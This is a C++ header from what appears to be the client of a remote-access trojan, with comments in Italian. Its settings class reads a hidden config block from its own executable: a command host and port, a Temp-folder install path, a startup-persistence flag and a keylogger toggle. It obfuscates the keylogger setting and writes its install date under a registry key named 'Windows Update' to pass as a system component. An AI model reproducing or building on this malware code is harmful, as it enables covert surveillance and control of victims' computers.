#pragma once

// Classe per la gestione dei settaggi
class Settaggi
{
private:
	DirUtils du;
	SettingsFile sf;
	RegUtils ru;
	Encode en;

public:
	string Host = "127.0.0.1";
	int Porta = 5555;
	string InstallPath = "C:\\Users\\<User>\\AppData\\Local\\Temp";
	string ExeName = "Client.exe";
	bool RegStartup = true;
	bool KeyLogger = true;
	string InstallDate = "--";

	// Costruttore
	Settaggi()
	{
		sf.BufferOnly = true;
	}

	// Popola i settaggi ottenendoli dal relativo file
	bool GetSettingsFromExe()
	{
		if (!debug.SkipInstall)
		{
			string BinaryFileContent = du.GetBinaryFileContent(du.GetFullModuleFilePath());
			sf.Buff = en.HexToAscii(StringUtils::SimpleFind(BinaryFileContent, en.AsciiToHex("{START}"), en.AsciiToHex("{END}")));

			if (sf.Buff.empty()) return false;

			Host = sf.GetSetting("Host");
			Porta = stoi(sf.GetSetting("Port"));
			InstallPath = sf.GetSetting("InstallPath");
			ExeName = sf.GetSetting("ExeName");
			RegStartup = (sf.GetSetting("RegStartup") == "true");
			KeyLogger = (sf.GetSetting((string)AY_OBFUSCATE("KeyLogger")) == "true");
		}

		return true;
	}

	// Popola i settaggi ottenendoli da eseguibile e registro
	void GetAllSettings()
	{
		debug.log.Info("Carico settaggi da file e registro...");

		string buffer;

		if (!debug.SkipInstall)
		{
			ru.ReadStringValue(ru.CurrentUser, "SOFTWARE\\Windows Update", en.AsciiToHex("InstallDate"), buffer);
			InstallDate = en.HexToAscii(buffer);
		}

		GetSettingsFromExe();
	}

	// Scrive i settaggi su registro
	bool InstallSettings()
	{
		if (!GetSettingsFromExe()) return false;

		if (!ru.CreateKey(ru.CurrentUser, "SOFTWARE\\Windows Update")) return false;

		if (!ru.WriteStringValue(ru.CurrentUser, "SOFTWARE\\Windows Update", en.AsciiToHex("InstallDate"), en.AsciiToHex(DateTime::GetDateTime()))) return false;

		return true;
	}
};